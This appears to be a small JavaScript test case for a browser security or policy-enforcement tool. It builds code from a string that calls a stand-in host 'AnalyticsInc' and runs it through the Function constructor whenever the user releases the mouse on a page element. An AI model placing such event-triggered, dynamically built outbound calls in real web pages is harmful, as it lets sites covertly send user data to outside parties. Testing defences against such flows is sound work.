// exfil_test_onmouseup2.js
var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=onmouseup2", true);xmlhttp.send(null);';
document.getElementById("test").addEventListener("mouseup", JAM.call(Function, null, [exp]), false)

